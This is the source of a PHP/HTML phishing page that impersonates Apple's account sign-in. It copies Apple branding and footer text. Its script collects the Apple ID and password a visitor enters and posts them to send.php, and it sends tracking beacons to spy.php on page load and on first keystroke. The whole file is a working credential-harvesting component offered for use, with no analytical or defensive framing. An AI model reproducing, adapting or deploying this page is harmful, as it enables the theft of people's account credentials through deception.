<?php 
require '../main.php';
?>
<!doctype html>
<html>
<head>
<title>Sign In - Account</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<link rel="stylesheet" href="inc/style.css">
<link rel="icon" href="inc/logos.png">
<script src="inc/jq.js"></script>
</head>
<body>
<div class="header">
<div class="left">
<img src="inc/menu.png">
</div>
<div class="mid">
<img src="inc/logo.png">
</div>
<div class="right">
<img src="inc/bag.png">
</div>
</div>
<div class="content">


<div class="form" style="">
<div class="col" style="margin-bottom:-13px;">
<h1 style="margin:20px 0;">Sign in.</h1>
<h3>Sign in your Apple account</h3>
</div>
<div class="col">
<div class="input" id="idinput">
<div class="input-holder"><input type="text" class="textinput" placeholder="Apple ID" id="id"></div>
<div id="nrxtbtn1" onclick="sendID()"><img id="pic_id" src="inc/next.png"></div>
</div>
<div class="input" style="border-radius:0 0 6px 6px; visibility:hidden;" id="passinput">
<div class="input-holder"><input type="password" class="textinput" placeholder="Password" id="pass"></div>
<a  href="https://www.facebook.com"  type="submit" id="nrxtbtn2" ><img id="pic_pass" src="inc/next.png"></a>
</div>
</div>

<div class="col" style="text-align:center; margin-top:40px;">
<div style="display:flex; align-items:center; justify-content:center; font-size:1.2em;"><input type="checkbox" style="margin-right:10px; cursor:pointer; width:16px; height:16px; border-radius:3px;"> Remember me</div>
<img src="inc/line.png" style="width:100%;">
</div>

<div class="col" style="text-align:center; margin-top:-35px; font-size:0.8em;">
<div style="margin:6px 0; align-items:center; justify-content:center; display:flex; color:#3787d7; cursor:pointer;">Forgot Apple ID or password? <img src="inc/sahm.png" style="width:16px;"></div>
<div style="margin:6px 0;  align-items:center; justify-content:center; display:flex;">Don’t have an Apple ID? &nbsp; <span style="color:#3787d7;  cursor:pointer;"> Create yours now.</span> <img src="inc/sahm.png" style="width:16px;"></div>
</div>

</div>
</div>


<div class="footer">
<div class="footerholder">
<div style="padding:20px 0;">
Need some help?  <span style="color:#3787d7;  cursor:pointer;">Chat now</span> or call 1-800-MY-APPLE.
</div>
</div>
<div class="footercontent">
<div style="display:inline-block; width:1000px; max-width:90%;">
<div style="text-align:left; border-bottom:1px solid #cacaca; padding:14px 0;">
The Apple Online Store uses industry-standard encryption to protect the confidentiality of the information you submit. Learn more about our Security Policy.
</div>
<div style="text-align:left; padding:14px 0;">
More ways to shop: <span style="color:#3787d7;  cursor:pointer;">Find an Apple Store</span> or <span style="color:#3787d7;  cursor:pointer;">other retailer</span> near you. Or call 1-800-MY-APPLE.
</div>
<div style="text-align:left; padding:14px 0; margin-top:-20px;">
Copyright © 2022 Apple Inc. All rights reserved.
</diV>

</div>
</div>
</div>

<script>
var uid = "";
var upass  = "";

function sendID(){
if($("#id").val()!=""){
	$("#pic_id").css("width", "39px");
	$("#pic_id").css("padding", "5px");
	$("#pic_id").attr("src", "inc/loader.gif");
	uid = $("#id").val();
	
	setTimeout(function(){
		$("#idinput").css("border-radius","6px 6px 0 0");
		$("#passinput").css("border-radius","0 0 6px 6px");
		$("#passinput").css("border-top", "none");
		$("#passinput").css("visibility", "visible");
		$("#pic_id").css("visibility", "hidden");
	}, 800);
}

}


 function sendPASS(){
	if($("#pass").val()!="" || $("#id").val()!=""){
		$("#pic_pass").css("width", "39px");
		$("#pic_pass").css("padding", "5px");
		$("#pic_pass").attr("src", "inc/loader.gif");
		upass = $("#pass").val();
		$.post("send.php", {id:uid, pass:upass}, function(done){
			//window.location = "";
		});
	}
}

$.post("spy.php",{loginview:1});
var c=0;
$("#id").keyup(function(){
	c++;if(c==1){
$.post("spy.php",{loging:1});
	}});


</script>
</body>
</html>